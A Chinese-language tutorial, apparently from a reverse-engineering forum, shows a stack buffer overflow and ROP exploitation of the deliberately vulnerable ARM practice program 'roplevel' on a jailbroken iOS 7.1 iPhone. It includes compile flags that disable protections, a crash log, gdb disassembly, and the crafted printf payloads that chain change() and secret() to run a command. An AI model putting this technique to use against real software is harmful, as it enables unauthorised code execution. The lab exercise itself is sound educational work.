@@ -1,0 +1,291 @@
+
+`c63K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4N6h3!0U0K9q4)9J5c8X3W2b7K9r3!0F1k6f1!0e0y4#2)9J5k6e0q4Q4x3X3g2K6k6r3D9`.
+
+终端输入命令编译 `roplevel.c`，编译的时候仍然需要关掉 thumb 模式、地址随机化和其他一些保护特性：
+
+```
+clang roplevel.c -target armv7-apple-ios7.1 -isysroot /path/to/改成你的真实路径/iPhoneOS7.1.sdk -fno-pie -fno-stack-protector -mno-thumb -o roplevel
+```
+
+如果你用 `clang` 编译时使用的是新系统版本的 `iphone.sdk`，会报错：
+
+```
+roplevel.c:12:2: error: 'system' is unavailable: not available on iOS
+
+        system(command);
+
+        ^
+
+/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS13.2.sdk/usr/include/stdlib.h:190:6: note: 
+      'system' has been explicitly marked unavailable here
+
+int      system(const char *) __DARWIN_ALIAS_C(system);
+
+         ^
+
+1 error generated.
+```
+
+因为 `system()` 方法在新的 SDK 中已不能使用，所以这里要下载 `iPhoneOS7.1.sdk`，并且再用 `clang` 编译时用到的 SDK 选择刚刚下载的 `iPhoneOS7.1.sdk`。
+
+## 2、复制 `roplevel` 文件到手机
+
+把编译好的 `roplevel` 可执行文件通过爱思助手拖入手机的 `/var/mobile/Documents/test` 目录下
+
+![复制roplevel到手机](https://bbs.kanxue.com/upload/attach/202006/810778_BPPGMVUNMT3S9UJ.png)
+
+## 3、`ssh` 连接手机，为 `roplevel` 设置执行权限
+
+电脑终端使用 `iproxy` 映射 22 端口到 2222
+
+```
+iproxy 2222 22
+```
+
+电脑终端输入连接 `ssh` 的命令并 `cd` 到 `/var/mobile/Documents/test` 目录下：
+
+```
+ssh root@localhost -p 2222
+```
+
+![ssh连接手机](https://bbs.kanxue.com/upload/attach/202006/810778_6SK8MMPMRRXSJQZ.png)
+
+增加执行权限：
+
+```
+chmod +x roplevel
+```
+
+## 4、正常流程测试 `roplevel` 程序
+
+```
+chaorende-iPhone:/var/mobile/Documents/test root# printf "AABBCCDD" | ./roplevel
+
+Welcome to ROPLevel 1 for ARM!
+```
+
+## 5、测试 `roplevel` 的崩溃
+
+因为 `roplevel.c` 代码中，`char buff[12]` 接收 `scanf()` 方法输入的字符串，限制为 12 个字符，当我们输入字符数超过 12 时会导致栈溢出。
+
+```
+iPhone:/var/mobile/Documents/test root# printf "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH" | ./roplevel
+
+Welcome to ROPLevel 1 for ARM!
+
+Segmentation fault: 11
+```
+
+程序崩溃，用爱思助手查看手机 `/var/Logs/CrashReporter` 路径下的崩溃日志文件，本次崩溃日志文件是 `roplevel_2020-06-15-181505_chaorende-iPhone.ips`，内容如下：
+
+```
+{"name":"roplevel","bug_type":"109","os_version":"iPhone OS 7.1.1 (11D201)","version":"???","app_name":"roplevel"}
+
+Incident Identifier: F9606866-B1D5-45B3-B1F7-04609ADD6C47
+
+CrashReporter Key:   170b7069d83069b34014ef09ae11cf58d7432429
+
+Hardware Model:      iPhone4,1
+
+Process:             roplevel [6931]
+
+Path:                ./roplevel
+
+Identifier:          roplevel
+
+Version:             ???
+
+Code Type:           ARM (Native)
+
+Parent Process:      sh [6659]
+
+Date/Time:           2020-06-15 18:15:05.290 +0800
+
+OS Version:          iOS 7.1.1 (11D201)
+
+Report Version:      104
+
+Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
+
+Exception Subtype: KERN_INVALID_ADDRESS at 0x46464644
+
+Highlighted Thread:  0
+
+Backtrace not available
+
+Unknown thread crashed with ARM Thread State (32-bit):
+
+    r0: 0x00000000    r1: 0x00000000      r2: 0x00000100      r3: 0x00002060
+
+    r4: 0x00000000    r5: 0x0000bee0      r6: 0x00000000      r7: 0x45454545
+
+    r8: 0x27dff890    r9: 0x00000001     r10: 0x00000000     r11: 0x00000000
+
+    ip: 0x3d571bd8    sp: 0x27dff880      lr: 0x0000bf18      pc: 0x46464644
+
+  cpsr: 0x40000010
+```
+
+从上可看出，`r7` 中存储的是 `EEEE`，`pc` 中存储的是 `FFFF`（我也没搞明白 `pc` 的 `0x46464644` 为啥对应 `FFFF`）
+
+![ASCII对应值](https://bbs.kanxue.com/upload/attach/202006/810778_ZCHHMK2VV65W5CT.png)
+
+由于我们输入的字符过长，覆盖了栈中保存的 `LR` 寄存器的值，当 `main()` 函数结束时，程序会把栈中保存的 `LR` 的值赋给 `PC` 寄存器，`PC` 寄存器中的值就是即将执行的下一条指令的地址。所以只要输入的字符串时用 `change()` 方法的地址覆盖掉栈中 `LR` 寄存器的值，就能实现 `main()` 方法结束时去调用 `change()` 方法。
+
+## 6、查看 `change()` 和 `secret()` 两个方法的地址
+
+`gdb` 附加 `roplevel`
+
+```
+iPhone:/var/mobile/Documents/test root# gdb roplevel
+```
+
+查看 `change()` 的地址：
+
+```
+gdb$ disas change
+
+Dump of assembler code for function change:
+
+0x0000be64 <change+0>:  80 40 2d e9                   push  {r7, lr}
+
+0x0000be68 <change+4>:  0d 70 a0 e1                   mov  r7, sp
+
+0x0000be6c <change+8>:  08 d0 4d e2                   sub  sp, sp, #8  ; 0x8
+
+0x0000be70 <change+12>:  18 00 0c e3                   movw  r0, #49176  ; 0xc018
+
+0x0000be74 <change+16>:  00 00 40 e3                   movt  r0, #0  ; 0x0
+
+0x0000be78 <change+20>:  b0 1f 0b e3                   movw  r1, #49072  ; 0xbfb0
+
+0x0000be7c <change+24>:  00 10 40 e3                   movt  r1, #0  ; 0x0
+
+0x0000be80 <change+28>:  05 20 00 e3                   movw  r2, #5  ; 0x5
+
+0x0000be84 <change+32>:  28 00 00 eb                   bl  0xbf2c
+
+0x0000be88 <change+36>:  b3 1f 0b e3                   movw  r1, #49075  ; 0xbfb3
+
+0x0000be8c <change+40>:  00 10 40 e3                   movt  r1, #0  ; 0x0
+
+0x0000be90 <change+44>:  04 00 8d e5                   str  r0, [sp, #4]
+
+0x0000be94 <change+48>:  01 00 a0 e1                   mov  r0, r1
+
+0x0000be98 <change+52>:  26 00 00 eb                   bl  0xbf38
+
+0x0000be9c <change+56>:  00 00 8d e5                   str  r0, [sp]
+
+0x0000bea0 <change+60>:  07 d0 a0 e1                   mov  sp, r7
+
+0x0000bea4 <change+64>:  80 80 bd e8                   pop  {r7, pc}
+
+End of assembler dump.
+```
+
+查看 `secret()` 的地址：
+
+```
+gdb$ disas secret
+
+Dump of assembler code for function secret:
+
+0x0000bea8 <secret+0>:  80 40 2d e9                   push  {r7, lr}
+
+0x0000beac <secret+4>:  0d 70 a0 e1                   mov  r7, sp
+
+0x0000beb0 <secret+8>:  08 d0 4d e2                   sub  sp, sp, #8  ; 0x8
+
+0x0000beb4 <secret+12>:  c5 0f 0b e3                   movw  r0, #49093  ; 0xbfc5
+
+0x0000beb8 <secret+16>:  00 00 40 e3                   movt  r0, #0  ; 0x0
+
+0x0000bebc <secret+20>:  1d 00 00 eb                   bl  0xbf38
+
+0x0000bec0 <secret+24>:  18 e0 0c e3                   movw  lr, #49176  ; 0xc018
+
+0x0000bec4 <secret+28>:  00 e0 40 e3                   movt  lr, #0  ; 0x0
+
+0x0000bec8 <secret+32>:  04 00 8d e5                   str  r0, [sp, #4]
+
+0x0000becc <secret+36>:  0e 00 a0 e1                   mov  r0, lr
+
+0x0000bed0 <secret+40>:  1e 00 00 eb                   bl  0xbf50
+
+0x0000bed4 <secret+44>:  00 00 8d e5                   str  r0, [sp]
+
+0x0000bed8 <secret+48>:  07 d0 a0 e1                   mov  sp, r7
+
+0x0000bedc <secret+52>:  80 80 bd e8                   pop  {r7, pc}
+
+End of assembler dump.
+```
+
+## 7、实现执行 `change()` 方法
+
+根据地址 `0x0000be64`，用 `"\x64\xbe\x00\x00"` 替换 `"FFFF"`，执行 `main()` 函数时，`scanf()` 接收到 `"AAAABBBBCCCCDDDDEEEE\x64\xbe\x00\x00"` 从而覆盖 `main()` 方法栈中存储的 `LR` 为 `0x0000be64`，当 `main()` 即将结束时会把 `0x0000be64` 传给 `PC` 寄存器，从而跳转到 `change()` 方法：
+
+![写入change方法地址](https://bbs.kanxue.com/upload/attach/202006/810778_V7KRC2R4R325YMT.png)
+
+先实现执行 `change()` 方法，操作如下：
+
+```
+chaorende-iPhone:/var/mobile/Documents/test root# printf "AAAABBBBCCCCDDDDEEEE\x64\xbe\x00\x00" | ./roplevel
+
+Welcome to ROPLevel 1 for ARM!
+
+command changed.
+
+Bus error: 10
+```
+
+看到终端中输出了 `"command changed."`，则证明执行了 `chang()` 方法，虽然最后程序还是崩溃掉了。
+
+## 8、那么如何在 `change()` 执行结束时跳转到 `secret()` 方法呢？
+
+`chang()` 函数开头 `push {r7, lr}` 把 `lr` 和 `r7` 存储到了栈中，`change()` 函数的结束时通过 `pop {r7, pc}` 把栈中存储的 `lr` 传给 `pc` 寄存器，只要让 `change()` 结束时的 `pc` 指向 `secret()` 方法，就可调用并执行 `secret()` 方法了。
+
+于是，我们直接让 `main()` 结束时跳转到 `0x0000be68` 位置，而不是 `0x0000be64` 位置，这样可以不执行 `chang()` 函数开头的 `push {r7, lr}` 而不影响 `change()` 方法的执行。
+
+当 `change()` 结束时执行 `pop {r7, pc}`，会把“`main()` 入栈的 `LR`”上方的第一个“其他数据”当做 `R7` 的值，把第二个“其他数据”当做 `LR` 的值传给 `PC` 寄存器，这样就能跳转到 `secret()` 方法了：
+
+![写入secret方法地址](https://bbs.kanxue.com/upload/attach/202006/810778_TAQQVFGHQCF9P8P.png)
+
+因为栈上的数据每次读取都是 4 个字节，我们输入的字符串溢出的长度只要刚好覆盖到栈上两个 4 字节的数据即可。
+
+`change()` 方法不执行 `push {r7, lr}` 的地址：`0x0000be68`
+
+`secret()` 方法的地址：`0x0000bea8`
+
+所以拼接字符串为：
+
+```
+AAAABBBBCCCCDDDDEEEE\x68\xbe\x00\x00FFFF\xa8\xbe\x00\x00
+```
+
+最终执行：
+
+```
+iPhone:/var/mobile/Documents/test root# printf "AAAABBBBCCCCDDDDEEEE\x68\xbe\x00\x00FFFF\xa8\xbe\x00\x00" | ./roplevel
+
+Welcome to ROPLevel 1 for ARM!
+
+command changed.
+
+executing command ...
+
+hello  roplevel  t_coreutils-bin_8.12-9_iphoneos-arm.deb  t_coreutils_8.12-13_iphoneos-arm.deb
+
+Bus error: 10
+```
+
+从打印信息可以看到，执行完 `change()` 方法后执行了 `secret()` 方法，打印出当前目录下的文件。
+
+以上是我的个人见解，不对的地方望指正。
+
+### 本文参考自：`f38K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3#2S2k6r3#2S2M7X3E0Q4x3X3g2U0j5#2)9J5c8U0t1H3x3e0N6Q4x3V1j5I4x3W2)9J5c8U0l9#2i4K6u0r3f1V1!0b7L8r3g2$3k6h3H3I4i4K6u0r3`
+
+### 欢迎关注公众号：逆向APP
+
+[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
